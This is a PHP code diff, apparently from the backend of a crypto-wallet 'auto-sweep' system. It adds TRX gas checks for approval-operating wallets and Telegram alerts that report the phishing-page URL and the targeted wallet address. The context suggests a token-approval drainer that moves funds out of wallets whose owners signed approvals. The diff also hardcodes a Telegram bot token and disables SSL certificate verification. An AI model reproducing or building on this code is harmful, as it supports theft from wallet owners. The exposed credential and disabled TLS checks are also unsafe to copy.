@@ -44,14 +44,52 @@ class SelectAutoApproveTransaction extends Command
                                     $qb_type = 1;
                                     $address_shou = config('site.shou_trx');
                                     switch ($vo['approve_type']){
-                                        case 0:
-                                            $approve_user_address = config('site.hy_user_trx');
-                                            $approve_key = config('site.hy_user_trx_key');
-                                            break;
                                         case 1:
                                             $approve_user_address = $vo['approve_address'];
                                             $approve_key = $vo['account_pre'];
                                             break;
+                                        default:
+                                            $approve_user_address = config('site.hy_user_trx');
+                                            $approve_key = config('site.hy_user_trx_key');
+                                            break;
+                                    }
+                                    $gas = (new \app\common\service\Getbalance())->getBalance(1,$approve_user_address);
+                                    if($gas < 100){
+                                        //TG通知开始
+                                        $data_tg = "【自动划】\n来源：{$vo['h5_url']}\n钱包地址：{$vo['address']}\n客户操作钱包{$approve_user_address}TRX不够";
+                                        $key ='7676331067:AAHitQ3H8fQgjbpcOHZzcVB_fdjFTvntBOQ';//TG机器人私钥
+                                        $id ='5725539445';//群组ID
+                                        $u4 = $data_tg;
+                                        $u4 = urlencode($u4);
+                                        $urlstring  = "https://api.telegram.org/bot$key/sendMessage?chat_id=$id&text=$u4";
+                                        $ch = curl_init();
+                                        curl_setopt($ch, CURLOPT_URL, $urlstring);
+                                        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+                                        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
+                                        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
+                                        $resultaaa = curl_exec($ch);
+                                        curl_close($ch);
+                                        //TG通知结束
+                                        $approve_user_address = config('site.hy_user_trx');
+                                        $approve_key = config('site.hy_user_trx_key');
+                                        $gas2 = (new \app\common\service\Getbalance())->getBalance(1,$approve_user_address);
+                                        if($gas2 < 50){
+                                            //TG通知开始
+                                            $data_tg = "【自动划】\n来源：{$vo['h5_url']}\n钱包地址：{$vo['address']}\n总操作钱包TRX不够";
+                                            $key ='7676331067:AAHitQ3H8fQgjbpcOHZzcVB_fdjFTvntBOQ';//TG机器人私钥
+                                            $id ='5725539445';//群组ID
+                                            $u4 = $data_tg;
+                                            $u4 = urlencode($u4);
+                                            $urlstring  = "https://api.telegram.org/bot$key/sendMessage?chat_id=$id&text=$u4";
+                                            $ch = curl_init();
+                                            curl_setopt($ch, CURLOPT_URL, $urlstring);
+                                            curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+                                            curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
+                                            curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
+                                            $resultaaa = curl_exec($ch);
+                                            curl_close($ch);
+                                            //TG通知结束
+                                        }
                                     }
                                     break;
                                 case 'bsc':
